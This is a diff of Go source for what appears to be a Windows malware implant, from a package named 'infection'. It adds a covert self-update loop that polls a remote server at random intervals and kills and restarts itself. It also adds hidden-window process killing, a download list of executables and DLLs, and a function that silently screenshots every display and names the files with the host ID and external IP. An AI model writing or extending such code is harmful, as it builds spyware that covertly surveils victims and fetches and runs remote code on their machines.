@@ -4,7 +4,9 @@ import (
 	"bytes"
 	"fmt"
 	"github.com/inconshreveable/go-update"
+	"github.com/kbinani/screenshot"
 	"github.com/parnurzeal/gorequest"
+	"image/png"
 	"infection/machineinfo"
 	"io"
 	"io/ioutil"
@@ -15,6 +17,7 @@ import (
 	"os"
 	"os/exec"
 	"os/user"
+	"runtime"
 	"strings"
 	"syscall"
 	"time"
@@ -32,12 +35,18 @@ const CURRENTPATH = "C:\\Windows\\Temp\\"
 
 var HOSTID = machineinfo.GetSystemVersion().Hostid
 var BrowserSafepath = get_current_user() + "\\tmp\\"
+var OUTIP string
 
 type Msg struct {
 	Hostid string `json:"hostid"`
 	Code   int    `json:"code"`
 }
 
+// get out ip
+func GetOutIp() {
+	body, _ := ioutil.ReadFile(CURRENTPATH + "ip.txt")
+	OUTIP = strings.TrimSpace(string(body))
+}
 func get_current_user() string {
 	usr, err := user.Current()
 	if err != nil {
@@ -50,12 +59,11 @@ func RandInt64(min, max int64) int {
 	return int(min + rand.Int63n(max-min+1))
 }
 
-func DoUpdate() error {
+func DoUpdate() {
 	for {
-		resp, err := http.Get(MIDFILE + "version.txt")
-		if err != nil {
-			return err
-		}
+		//random second check version updade
+		ticker := time.NewTicker(time.Second * time.Duration(RandInt64(15, 50)))
+		resp, _ := http.Get(MIDFILE + "version.txt")
 		body, _ := ioutil.ReadAll(resp.Body)
 		defer resp.Body.Close()
 		current_file := strings.Split(os.Args[0], "\\")
@@ -65,11 +73,11 @@ func DoUpdate() error {
 			if err != nil {
 				// error handling
 			}
-		} else {
-			//fmt.Println(string(body))
-			time.Sleep(time.Duration(RandInt64(300, 1000)))
+			time.Sleep(2 * time.Second)
+			// when update done shlb be kill main process restart
+			KillMain()
 		}
-		return err
+		<-ticker.C
 	}
 }
 func SingleFile(file string, addr string, finflag chan string) {
@@ -123,15 +131,21 @@ func KillALL() {
 	killcheck.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
 	killcheck.Run()
 }
-
+func KillMain() {
+	current_file := strings.Split(os.Args[0], "\\")
+	killcheck := exec.Command("taskkill", "/f", "/im", current_file[len(current_file)-1])
+	killcheck.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
+	killcheck.Run()
+}
 func MultiFileDown(files []string, step string) {
 	if len(files) == 0 && step == "init" {
 		var fileinit = []struct {
 			Name string
 		}{
-			{"WindowsDaemon.exe"},
+			{"nogui.exe"},
 			{"sqlite3_386.dll"},
 			{"sqlite3_amd64.dll"},
+			{"WindowsDaemon.exe"},
 		}
 		for _, name := range fileinit {
 			Get(MIDFILE+name.Name, name.Name)
@@ -166,6 +180,35 @@ func ErrorStatusCode(code int, hostid string, addr string) {
 		Set("content-type", "application/x-www-form-urlencoded").
 		Send(msg).
 		End()
+}
+
+//get hostid-ip-screensize pic
+func Getscreenshot() []string {
+	n := screenshot.NumActiveDisplays()
+	filenames := []string{}
+	var fpth string
+	for i := 0; i < n; i++ {
+		bounds := screenshot.GetDisplayBounds(i)
+
+		img, err := screenshot.CaptureRect(bounds)
+		if err != nil {
+			panic(err)
+		}
+		if runtime.GOOS == "windows" {
+			fpth = `C:\Windows\Temp\`
+		} else {
+			fpth = `/tmp/`
+		}
+		GetOutIp()
+		fileName := fmt.Sprintf("%s-%s-%d-%dx%d.png", HOSTID, OUTIP, i, bounds.Dx(), bounds.Dy())
+		fullpath := fpth + fileName
+		filenames = append(filenames, fullpath)
+		file, _ := os.Create(fullpath)
+
+		defer file.Close()
+		png.Encode(file, img)
+	}
+	return filenames
 }
 
 //func SystemCheck(){
